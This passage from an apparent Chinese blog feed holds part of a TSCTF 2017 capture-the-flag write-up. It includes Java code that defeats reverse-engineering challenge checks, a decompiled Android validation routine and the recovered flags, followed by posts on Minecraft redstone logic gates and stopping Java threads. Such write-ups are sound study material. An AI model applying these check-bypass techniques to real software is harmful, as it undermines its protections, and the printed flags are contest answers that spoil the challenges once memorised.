class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">boolean</span> readroad = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.contains(<span class="string">&quot;press enter to continue&quot;</span>)) &#123;</span><br><span class="line">                    printWriter.println();</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    System.out.println(<span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line">                    readroad = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (readroad &amp;&amp; !line.startsWith(<span class="string">&quot;We&quot;</span>)) &#123;</span><br><span class="line">                    String[] in = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    solution.addRoad(Integer.parseInt(in[<span class="number">0</span>]), Integer.parseInt(in[<span class="number">1</span>]));</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (readroad &amp;&amp; line.startsWith(<span class="string">&quot;We&quot;</span>)) &#123;</span><br><span class="line">                    solution.connectRoad();</span><br><span class="line">                    readroad = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;----&quot;</span>)) &#123;</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    String[] in = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    <span class="keyword">boolean</span> ans = solution.isConnected(Integer.parseInt(in[<span class="number">0</span>]), Integer.parseInt(in[<span class="number">1</span>]));</span><br><span class="line">                    printWriter.println(ans ? <span class="string">&quot;yes&quot;</span> : <span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    System.out.println(<span class="string">&quot;Ans--&quot;</span> + ans);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="reverseapkcheckin"><a class="markdownIt-Anchor" href="#reverseapkcheckin"></a> 【REVERSE&amp;APK】checkin</h1><p>逆向题，判断输入是否符合期望。主要有两个校验的地方。</p><p>第一个校验位数：</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image067.png" class="" title="checkin位数校验"><p>判断输入是否为32位长度。</p><p>第二个是校验输入和期望值：</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image069.png" class="" title="checkin输入校验"><p>flag在程序中不是明文存放的，在之前将密文flag运算得到明文flag，与输入进行比对。所以可以从该位置dump出内存中的flag为 <code>TSCTF&#123;0ops_Rev@zse_ls_sO_e4sY?!&#125;</code> 。</p><h1 id="reverseapktake-it-easy"><a class="markdownIt-Anchor" href="#reverseapktake-it-easy"></a> 【REVERSE&amp;APK】take it easy</h1><p>相比上一题，这一题是将输入运算到一个中间值与存储的值进行比对，内存中不再出现明文flag。</p><p>主要有四个子过程：</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image071.png" class="" title="takeiteasy位数校验"><p>第一还是检验输入长度是否为29位。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image073.png" class="" title="takeiteasy互换"><p>第二将每位的高6位与低2位互换。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image075.png" class="" title="takeiteasy异或"><p>第三将互换的结果与一个数组的数字取异或。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image077.png" class="" title="takeiteasy比对"><p>最后与另一个数组进行比对。</p><p>根据以上的思路，可以写一个解密的程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.take_it_easy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] ansbase = &#123;<span class="number">0x53</span>, <span class="number">0x96</span>, <span class="number">0xdb</span>, <span class="number">0x1d</span>, <span class="number">0xaa</span>, <span class="number">0xd6</span>,</span><br><span class="line">            <span class="number">0xd4</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x15</span>, <span class="number">0xfe</span>, <span class="number">0x85</span>,</span><br><span class="line">            <span class="number">0x78</span>, <span class="number">0x89</span>, <span class="number">0x65</span>, <span class="number">0xd2</span>, <span class="number">0xb6</span>, <span class="number">0x12</span>,</span><br><span class="line">            <span class="number">0xfb</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0xb7</span>, <span class="number">0x50</span>, <span class="number">0x84</span>,</span><br><span class="line">            <span class="number">0x5d</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x99</span>, <span class="number">0x57</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] xorbase = &#123;<span class="number">0x46</span>, <span class="number">0x42</span>, <span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x3b</span>, <span class="number">0x08</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x25</span>, <span class="number">0x4c</span>, <span class="number">0x62</span>, <span class="number">0x59</span>,</span><br><span class="line">            <span class="number">0x21</span>, <span class="number">0x5e</span>, <span class="number">0x29</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x48</span>,</span><br><span class="line">            <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x09</span>, <span class="number">0x2b</span>, <span class="number">0x09</span>, <span class="number">0x58</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0x63</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x08</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ansbase.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = ansbase[i] ^ xorbase[i];</span><br><span class="line">            <span class="keyword">char</span> ch = (<span class="keyword">char</span>) ((((tmp &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">7</span>) - <span class="number">1</span>)) &lt;&lt; <span class="number">2</span>) | (tmp &gt;&gt; <span class="number">6</span>))&amp;<span class="number">0xff</span>);</span><br><span class="line">            System.out.print(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Solution solution = <span class="keyword">new</span> Solution();</span><br><span class="line">        solution.work();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="reverseapkbaby_android"><a class="markdownIt-Anchor" href="#reverseapkbaby_android"></a> 【REVERSE&amp;APK】baby_android</h1><p>把APK包丢到Bytecodeviewer里看了一下，一个简单的Android逆向题，验证逻辑都写在com.tsctf2017.myapplication.MainActivity.check();函数里。<br />Check的反编译代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(var1.startsWith(<span class="string">&quot;TSCTF&#123;&quot;</span>) &amp;&amp; var1.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">        String var2 = var1.substring(<span class="number">6</span>, -<span class="number">1</span> + var1.length());</span><br><span class="line">        <span class="keyword">if</span>(var2.length() == <span class="number">32</span> &amp;&amp; Pattern.compile(<span class="string">&quot;[0-9a-f]+&quot;</span>).matcher(var2).matches()) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = var2.getBytes();</span><br><span class="line">        <span class="keyword">int</span> var4 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        String var5;</span><br><span class="line">        <span class="keyword">for</span>(var5 = <span class="string">&quot;&quot;</span>; var4 &lt; var3.length; ++var4) &#123;</span><br><span class="line">            <span class="keyword">byte</span> var6 = var3[var4];</span><br><span class="line">            <span class="keyword">if</span>(var6 &lt;= <span class="number">102</span> &amp;&amp; var6 &gt;= <span class="number">97</span>) &#123;</span><br><span class="line">                var5 = var5 + (<span class="number">10</span> + (var6 - <span class="number">97</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var5 = var5 + (var6 - <span class="number">48</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(var5.equals(<span class="string">&quot;1192811610815159146852912439081023130161513&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要算法逻辑是判断输入字符串是否以开头和结尾TSCTF{}，并且内部的字符字符串只有0-9和a-f，对于0-9的字符，转换成对应数字，对于a-f转换成10-15的数字，将这些拼接起来判断是否与1192811610815159146852912439081023130161513相等。</p><p>根据算法手动逆推得到字符串b928b6a8ff9e68529c43908a23d016fd最后flag为 <code>TSCTF&#123;b928b6a8ff9e68529c43908a23d016fd&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本着互动娱乐的精神，我们三个人组成了【新建文件夹】队参加了这次TSCTF2017的比赛。比赛题目采用浮动分数值，题目起始分1000，解出的人数越多，题目的分值越低。比赛时长36小时，截止到比赛结束总共放出了30题，我们队解出了其中17题。&lt;/p&gt;
&lt;p&gt;下面说一下我们解出题</summary>
      
    
    
    
    <category term="读书笔记" scheme="https://sumygg.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ctf" scheme="https://sumygg.com/tags/ctf/"/>
    
    <category term="tsctf" scheme="https://sumygg.com/tags/tsctf/"/>
    
    <category term="新建文件夹" scheme="https://sumygg.com/tags/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
    
    <category term="比赛" scheme="https://sumygg.com/tags/%E6%AF%94%E8%B5%9B/"/>
    
    <category term="writeup" scheme="https://sumygg.com/tags/writeup/"/>
    
    <category term="结题报告" scheme="https://sumygg.com/tags/%E7%BB%93%E9%A2%98%E6%8A%A5%E5%91%8A/"/>
    
  </entry>
  
  <entry>
    <title>数字电路与Minecraft中的红石电路</title>
    <link href="https://sumygg.com/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/"/>
    <id>https://sumygg.com/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/</id>
    <published>2017-05-05T06:56:19.000Z</published>
    <updated>2021-03-16T08:51:02.964Z</updated>
    
    <content type="html"><![CDATA[<p>Minecraft中有很多吸引人的地方，其中一个就是<strong>红石电路</strong>系统。有牛人就用游戏的红石电路制作了8位计算器、数字显示器等等。</p><p>前几天看到了LeetCode上面的一道题目，对，就是那道用数字电路解法的题目。看完之后心血来潮，想着用Minecraft的红石电路弄一遍，一定会非常 <em>COOL</em> ~。<img class="emoji" draggable="false" alt="🆒" src="https://twemoji.maxcdn.com/2/72x72/1f192.png"/></p><h1 id="温习功课"><a class="markdownIt-Anchor" href="#温习功课"></a> 温习功课</h1><p>好吧，数字电路的内容大多数已经忘记，所以先温习一下吧，对应在Minecraft中的表现形式也一并展示出来。</p><h2 id="与或非门"><a class="markdownIt-Anchor" href="#与或非门"></a> 与或非门</h2><p>先从基本的<strong>与或非</strong>门开始。这三种逻辑电路的真值表如下：</p><table><thead><tr><th>A B</th><th>真 真</th><th>真 假</th><th>假 真</th><th>假 假</th></tr></thead><tbody><tr><td>A+B 或</td><td>真</td><td>真</td><td>真</td><td>假</td></tr><tr><td>AB  与</td><td>真</td><td>假</td><td>假</td><td>假</td></tr><tr><td>~A  非</td><td>假</td><td>假</td><td>真</td><td>真</td></tr></tbody></table><p><strong>非门</strong>（即“反相器”）的输入与输出相反。输入为1的时候输出为0，输入为0的时候输出为1。在Mincraft中可以使用<strong>红石火把</strong>的阻断特性来制作。红石火把默认输出信号，当有输入信号（如拉杆）的时候，红石火把会熄灭。由此与非门的特性一致。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/1.png" class="" title="非门"><p><strong>或门</strong>的任意一个输入为1，输出就会是1。或门有两个输入端，一个输出端。根据红石火把的特性，任意一个输入端为1的时候，输出端都为0，这正好与或门的输出相反。这更像一个<strong>或非门</strong>，于是，在最后再加上一个非门就变成我们需要的或门了。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/2.png" class="" title="或门"><p><strong>与门</strong>只有当两个输入都为1的时候，输出才会是1。根据或门的思路，从逻辑公式推演<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>B</mi><mo>=</mo><mover accent="true"><mover accent="true"><mrow><mi>A</mi><mi>B</mi></mrow><mo stretchy="true">‾</mo></mover><mo stretchy="true">‾</mo></mover><mo>=</mo><mover accent="true"><mrow><mover accent="true"><mi>A</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mover accent="true"><mi>B</mi><mo stretchy="true">‾</mo></mover></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">AB=\overline{\overline{AB}}=\overline{\overline{A}+\overline{B}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span><span style="top:-4.00333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.16666em;vertical-align:-0.08333em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">A</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span><span style="top:-4.00333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.08333em;"><span></span></span></span></span></span></span></span></span>，可能看推演公式看不出什么，但是看电路就会明白了。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/3.png" class="" title="与门"><h2 id="触发器"><a class="markdownIt-Anchor" href="#触发器"></a> 触发器</h2><p><strong>触发器</strong>是记忆电路相关的内容。上面提到的门电路的输出只与当前的输入有关，但有时候电路还需要“过去的输入”相关，也就是有记忆功能。完成这个功能的电路有<strong>锁存器</strong>和<strong>触发器</strong>。在现实生活中的电子学中，锁存器指对输入信号的某个状态产生反应的电路；触发器指对输入信号的变化产生反应的电路。</p><p>最基本的是<strong>RS触发器</strong>，RS触发器有三种模式：置0、置1和保持。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/4.png" class="" title="RS触发器"><p>一般常用的是精简的版本。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/5.png" class="" title="RS触发器精简版"><p>RS触发器存在禁止条件，R和S不能同时为1。这给使用者带来的不便。简单变化就是D触发器。关于D触发器有好多种实现方法，这里从<a href="http://minecraft-zh.gamepedia.com/%E8%AE%B0%E5%BF%86%E7%94%B5%E8%B7%AF#D.E8.A7.A6.E5.8F.91.E5.99.A8.E4.B8.8E.E9.97.A8.E6.8E.A7D.E9.94.81.E5.AD.98.E5.99.A8">记忆电路 - Minecraft Wiki</a>上找到了一个D寄存器简化的版本。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/D_latch_EFG.png" class="" title="D触发器简化图"><p>图例在这里<a href="http://minecraft-zh.gamepedia.com/%E7%BA%A2%E7%9F%B3%E5%9B%BE%E4%BE%8B">红石图例</a>。根据图可以构造一个简单的D寄存器。D触发器在CP=1的作用下将D端的输入数据送给触发器，当CP=0时Q(n+1)=Q(n)不变，故常用作锁存器，因此D触发器又称为D锁存器。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/6.png" class="" title="D触发器"><p>请无视入镜的史莱姆同志。。。</p><p>需要的内容大概就这些了，下面开始开工。</p><h1 id="开工"><a class="markdownIt-Anchor" href="#开工"></a> 开工</h1><p>了解了一些基础内容之后，需要制作我们的三进制加法计算器了。根据<a href="/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/">LeetCode Q137 Single Number II的数电AC方法</a>中推导的公式：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>=</mo><mi>X</mi><mover accent="true"><mi>Z</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">F_1=X\overline{Z}+YZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9666600000000001em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub><mo>=</mo><mi>Y</mi><mover accent="true"><mi>Z</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mover accent="true"><mi>X</mi><mo stretchy="true">‾</mo></mover><mover accent="true"><mi>Y</mi><mo stretchy="true">‾</mo></mover><mi>Z</mi></mrow><annotation encoding="application/x-tex">F_2=Y\overline{Z}+\overline{X}\overline{Y}Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9666600000000001em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span></span></p><p>分析一下，需要两个寄存器存储高位和低位，还需要一个按钮触发+1操作，最后需要一个显示的地方。这里只制作一个简单的 <strong>半加器</strong> ，变换的顺序为00-&gt;01-&gt;10-&gt;00。不考虑进位的情况。</p><p>制作的步骤是，先放置输入端，然后再放置两个<strong>D触发器</strong>，最后将与或非门填充进去。最后的效果就是这个样子。</p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/7.png" class="" title="三进制半加器"><p>没有电路精简，真是不忍直视呀。在制作的时候遇到了一些问题：</p><ol><li>电路重叠的时候，下层的红石火把很可能影响上层的电路；</li><li>由于电路传输有时间间隔，很容易造成信号跳动，两个D触发器变动不一致的话很容易互相影响，出现结果不一致的情况。</li></ol><p>对于第二个问题，没有找到一个好的解决方法，之好将两个触发器输出的延迟调高一些。从10-&gt;00的过程中出现的11的情况，最后的效果还是挺满意的吧。<img class="emoji" draggable="false" alt="😂" src="https://twemoji.maxcdn.com/2/72x72/1f602.png"/></p><img src="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/8.gif" class="" title="效果展示"><p>就这样吧，一天又过去了。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Minecraft中有很多吸引人的地方，其中一个就是&lt;strong&gt;红石电路&lt;/strong&gt;系统。有牛人就用游戏的红石电路制作了8位计算器、数字显示器等等。&lt;/p&gt;
&lt;p&gt;前几天看到了LeetCode上面的一道题目，对，就是那道用数字电路解法的题目。看完之后心血来潮，想着</summary>
      
    
    
    
    <category term="游戏人生" scheme="https://sumygg.com/categories/%E6%B8%B8%E6%88%8F%E4%BA%BA%E7%94%9F/"/>
    
    
    <category term="数字电路" scheme="https://sumygg.com/tags/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF/"/>
    
    <category term="minecraft" scheme="https://sumygg.com/tags/minecraft/"/>
    
    <category term="红石电路" scheme="https://sumygg.com/tags/%E7%BA%A2%E7%9F%B3%E7%94%B5%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>如何在Java中正确的终止一个线程</title>
    <link href="https://sumygg.com/2017/04/28/how-to-properly-stop-a-thread-in-java/"/>
    <id>https://sumygg.com/2017/04/28/how-to-properly-stop-a-thread-in-java/</id>
    <published>2017-04-28T12:55:14.000Z</published>
    <updated>2021-03-16T08:51:02.964Z</updated>
    
    <content type="html"><![CDATA[<h1 id="含有死循环的线程是无法知道自己该什么时候结束的"><a class="markdownIt-Anchor" href="#含有死循环的线程是无法知道自己该什么时候结束的"></a> 含有死循环的线程是无法知道自己该什么时候结束的</h1><p>一个工作线程需要不断接受外部的消息，这样的线程内部通常有一个死循环 <code>while(true)&#123;&#125;</code> 。因为死循环的存在，该线程自己无法知道何时才能停止循环，只能通过外部线程通知该线程的结束。</p><p>要结束一个线程，Thread里有一个 <code>stop()</code> 方法可以粗暴的杀死一个线程。这样做会出现一些问题，被结束的线程会被立即停止，没有时间处理一些善后工作。在多线程环境下，就可能会出现数据不一致的问题，这是非常危险的。因此，<code>stop()</code> 方法被置为_弃用_方法。</p><p>那么如何才能更好的结束一个线程？</p><h1 id="这里有两种方法可以让外部线程结束一个线程"><a class="markdownIt-Anchor" href="#这里有两种方法可以让外部线程结束一个线程"></a> 这里有两种方法可以让外部线程结束一个线程</h1><p>我们需要给线程处理善后工作的机会，一般来说就是给线程一个信号，希望线程能尽快完善工作，然后<strong>跳出</strong>死循环。</p><h2 id="设置标记变量"><a class="markdownIt-Anchor" href="#设置标记变量"></a> 设置标记变量</h2><p>在线程工作之余，检查标记变量，如果标记变量被改变，则自行中断退出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thread1</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> isStop = <span class="keyword">false</span>;</span><br><span 